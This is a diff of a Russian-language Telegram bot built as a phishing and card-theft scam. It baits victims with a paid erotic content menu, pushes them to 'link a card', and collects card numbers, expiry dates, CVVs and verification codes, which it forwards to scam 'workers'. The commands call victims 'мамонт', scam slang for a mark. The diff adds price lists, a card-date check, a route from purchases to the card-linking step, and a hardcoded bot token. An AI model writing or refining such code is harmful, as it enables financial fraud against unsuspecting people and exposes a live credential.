@@ -7,7 +7,7 @@ from os import listdir
 printlogo()
 
 print(Fore.RED+'Set data directory \n0-basedir\n1-basedirTermux')
-i=input()
+i='0'
 if i=='0':
     datadir='./data/'
     print(Fore.RED+Back.GREEN+'///'+Back.RESET+Fore.GREEN+' Set data as default')
@@ -18,21 +18,20 @@ else:
     datadir=str(i)
     print(Fore.RED+Back.GREEN+'///'+Back.RESET+Fore.GREEN+' Set data as '+datadir)
 
-sleep(0.2)
 
 print(Fore.RED+Back.RESET+'PROCESSING')
 
-sleep(0.2)
 
 loaddata()
 print(Fore.RED+'/// ENTER BOT TOKEN:')
-token=input()
+token='6897419170:AAFUkbPZI1O1MappribcchyJGGvqNAeLA4s'
 bot = telebot.TeleBot(token)
 print(Fore.RED+Back.GREEN+f'///'+Fore.GREEN+Back.RESET+' Bot launched')
 
 
 @bot.message_handler(commands=['vip'])
 def vip(message):
+    checklogin(message)
     localid=getdatafromid(message.chat.id)
     if message.text=='Вернуться':
         start(message)
@@ -45,6 +44,7 @@ def vip(message):
 
 @bot.message_handler(commands=['link'])
 def addlink(message):
+    checklogin(message)
     localtext=message.text
     if localtext=='/link':
         bot.send_message(message.chat.id, 'неполный запрос')
@@ -56,6 +56,7 @@ def addlink(message):
 
 @bot.message_handler(commands=['rlink'])
 def rlink(message):
+    checklogin(message)
     localtext=message.text
     if localtext=='/link':
         bot.send_message(message.chat.id, 'неполный запрос')
@@ -66,6 +67,7 @@ def rlink(message):
         savedata()
 
 def addcard(message):
+    checklogin(message)
     card1=(message.text)
     card1=card1.replace(' ', '')
     if card1=='Вернуться':
@@ -88,13 +90,14 @@ def addcard(message):
             bot.register_next_step_handler(message, addcard)
 
 def addcvv(message):
+    checklogin(message)
     text=str(message.text)
     date=text.split()
     if text == 'Вернуться':
         bot.send_message(message.chat.id, 'Привязка отменена')
         start(message)
     else:
-        if len(date[0])==5 and len(date[1])==3:
+        if len(date[0])==5 and len(date[1])==3 and str(date[0])[2]=='/':
             workermessage(f'{date} дата и CVV')
             workermessage(f'{message.from_user.id}')
             bot.send_message(message.chat.id, 'отлично. сейчас система проверит данные и пришлет код. введите его через команду /code')
@@ -112,6 +115,7 @@ def addcvv(message):
             bot.register_next_step_handler(message, addcvv)
 
 def code(message):
+    checklogin(message)
     codevar=(message.text)
     if codevar!=None:
         if codevar.isnumeric() and len(codevar)==4:
@@ -131,6 +135,7 @@ def code(message):
 
 @bot.message_handler(commands=['code'])
 def entercode(message):
+    checklogin(message)
     localid = message.from_user.id
     localid = getdatafromid(localid)
     if stage[localid]==2:
@@ -143,6 +148,7 @@ def entercode(message):
 
 @bot.message_handler(commands=['start'])
 def start(message):
+    checklogin(message)
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
     b1 = types.KeyboardButton('Меню')
     b2 = types.KeyboardButton('Личный кабинет')
@@ -155,15 +161,18 @@ def start(message):
 
 
 def menu(message):
+    checklogin(message)
     markup = types.InlineKeyboardMarkup()
-    b1 = types.InlineKeyboardButton('VIP канал', callback_data='buy')
-    b2 = types.InlineKeyboardButton('Кружок', callback_data='buy')
-    b3 = types.InlineKeyboardButton('Фоточки', callback_data='buy')
-    b4 = types.InlineKeyboardButton('Видео', callback_data='buy')
+    b1 = types.InlineKeyboardButton('VIP канал✨ | 0₽', callback_data='buy')
+    b2 = types.InlineKeyboardButton('Кружок📼 | 99₽', callback_data='buy')
+    b3 = types.InlineKeyboardButton('Фоточки📸 | 199₽', callback_data='buy')
+    b4 = types.InlineKeyboardButton('Видео📹 | 299₽', callback_data='buy')
+    b5 = types.InlineKeyboardButton('Виртик❤️ | 599₽', callback_data='buy')
     markup.row(b1)
     markup.row(b4)
     markup.row(b3)
     markup.row(b2)
+    markup.row(b5)
     bot.send_message(message.chat.id, 'Добро пожаловать в моё эротическое меню😈', reply_markup=markup)
     checklogin(message)
 
@@ -245,7 +254,7 @@ def getm(message):
     info=info+'\n'+'/senderr отправить ошибку мамонту через пробел указать ID'
     info+='\n /link добавить ссылку на приватку через пробел указать ссылку'
     info += '\n /rlink убрать ссылку на приватку через пробел указать ссылку'
-    info += '\n /mymam привязать мамонта через пробел указать ID'
+    #info += '\n /mymam привязать мамонта через пробел указать ID'
     info += '\n /addme указать себя как воркер'
     info += '\n /removeme убрать себя из воркеров'
     bot.send_message(message.chat.id, info, 'MarkdownV2')
@@ -275,7 +284,7 @@ def getm(message):
 def workermessage(mes):
     if len(worker)!=0:
         for i in range(0,len(worker)):
-            bot.send_message(f'ДЛЯ ВОРКЕРОВ: {worker[i]}',mes)
+            bot.send_message(worker[i],mes)
         print(f'/// New message for workers: {mes}')
 
 
@@ -298,21 +307,27 @@ def lk(message):
 
 def buy1(callback):
     markup=types.InlineKeyboardMarkup()
-    b1=types.InlineKeyboardButton('Личный кабинет',callback_data='lk')
-    markup.row(b1)
-    bot.delete_message(callback.message.chat.id, callback.message.id)
+    b1=types.InlineKeyboardButton('Привязать карту',callback_data='vip')
+    b2 = types.InlineKeyboardButton('Личный кабинет', callback_data='lk')
+    markup.row(b1,b2)
     bot.send_message(callback.message.chat.id, 'Для начала нужно пополнить баланс ;)', reply_markup=markup)
+    bot.delete_message(callback.message.chat.id, callback.message.id)
 
 
 @bot.callback_query_handler(func=lambda callback:True)
 def callback(callback):
     cb=callback.data
     if cb=='balance':
+        markup=types.InlineKeyboardMarkup(row_width=3)
+        b1=types.InlineKeyboardButton('Назад', callback_data='lk')
+        markup.row(b1)
+        bot.delete_message(callback.message.chat.id, callback.message.id)
         bot.answer_callback_query(callback_query_id=callback.id, text='Для вызова этой команды у вас должна быть привязана карта!')
+        bot.send_message(callback.message.chat.id, 'Для вызова этой команды у вас должна быть привязана карта!',reply_markup=markup)
     elif cb=='buy':
         buy1(callback)
     elif cb=='lk':
-        bot.delete_message(callback.message.chat.id, callback.message.id)
+        #bot.delete_message(callback.message.chat.id, callback.message.id)
         lk(callback.message)
     elif cb=='vip':
         bot.delete_message(callback.message.chat.id, callback.message.id)
@@ -335,4 +350,4 @@ def randmess(message):
     else:
         bot.send_message(message.chat.id, 'К сожалению я не смог распознать Вашу команду. Воспользуйтесь кнопками в меню или отправьте /start')
 
-bot.infinity_polling()
+bot.polling()
